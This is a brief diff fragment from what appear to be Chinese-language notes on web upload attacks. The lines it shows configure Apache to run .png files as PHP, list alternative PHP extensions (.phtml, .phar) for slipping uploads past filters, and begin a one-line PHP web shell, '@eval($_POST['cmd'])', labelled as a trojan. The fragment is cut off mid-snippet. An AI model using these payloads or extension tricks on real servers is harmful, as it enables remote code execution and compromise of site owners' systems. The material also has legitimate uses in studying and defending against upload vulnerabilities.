@@ -113,6 +113,7 @@ AddType指定
 AddType application/x-httpd-php .png
 将.png当作php文件解析
 木马
+上传文件，php扩展文件.phtml .phar .ptar
 <?php phpinfo(); ?>
 <?php 
 @eval($_POST['cmd']);
